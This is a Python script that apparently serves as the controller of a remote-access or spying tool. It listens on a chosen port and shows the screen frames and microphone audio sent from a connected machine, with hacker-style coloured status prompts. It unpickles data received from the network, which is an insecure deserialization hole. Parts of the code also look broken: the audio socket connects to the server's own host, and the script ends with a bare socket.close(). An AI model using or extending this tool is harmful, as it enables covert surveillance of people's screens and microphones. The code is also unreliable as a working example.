import socket
import cv2
import pickle
import pyaudio
import struct
from colorama import Fore
from os import system, path

# from vidstream import StreamingServer
from threading import Thread


""" Variables """
g = Fore.LIGHTGREEN_EX
r = Fore.LIGHTRED_EX
m = Fore.LIGHTMAGENTA_EX
y = Fore.LIGHTYELLOW_EX
wl = Fore.LIGHTWHITE_EX
w = Fore.WHITE

plus = g + "[+] " + w
minus = r + "[-] " + w
mul = m + "[*] " + w
dol = y + "[$] " + w

""" Functional """
class Server:
    def __init__(self):
        self.HOST = socket.gethostbyname(socket.gethostname())
        self.PORT = int(input("PORT: "))
        system("cls")
    
    def build(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind(("", self.PORT))
            self.sock.listen(5)

            print(f'{plus}Socket created')
            print(f'{plus}Socket bind complete\n')
            print(f"{plus}HOST - {self.HOST}\n{plus}PORT - {self.PORT}\n")
            
            self.sock_accept()
        except:
            print(f"{minus}Error build")
    
    def sock_accept(self):
        print(f'{mul}Socket now listening 🎲\n')
        
        self.conn, self.addr = self.sock.accept()
        print(f"{dol}Connected - {wl}{self.addr[0]}")
    
    def get_screen(self):
        payload_size = struct.calcsize('>L')
        data = b""
        
        self.running_micro = True
        thr = Thread(target=self.get_micro).start()


        while True:
            break_loop = False
            while len(data) < payload_size:
                received = self.conn.recv(4096)
                if received == b'':
                    self.conn.close()
                    break_loop = True
                    break
                data += received

            if break_loop:
                break

            packed_msg_size = data[:payload_size]
            data = data[payload_size:]

            msg_size = struct.unpack(">L", packed_msg_size)[0]

            while len(data) < msg_size:
                data += self.conn.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]

            frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.imshow(str(self.addr), frame)
            if cv2.waitKey(1) == ord("q"):
                self.running_micro = False
                cv2.destroyAllWindows()
                break

    def get_micro(self):
        port = 9112

        chunk = 8192
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        output=True,
                        frames_per_buffer=chunk)

        sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock1.connect((self.HOST, port))
        while self.running_micro:
            try:
                data = sock1.recv(32768)
                if data == b"":
                    continue
                stream.write(data,chunk)
            except:
                self.running_micro = False
            

        socket.close()

""" Start """
server = Server()
server.build()

server.get_screen()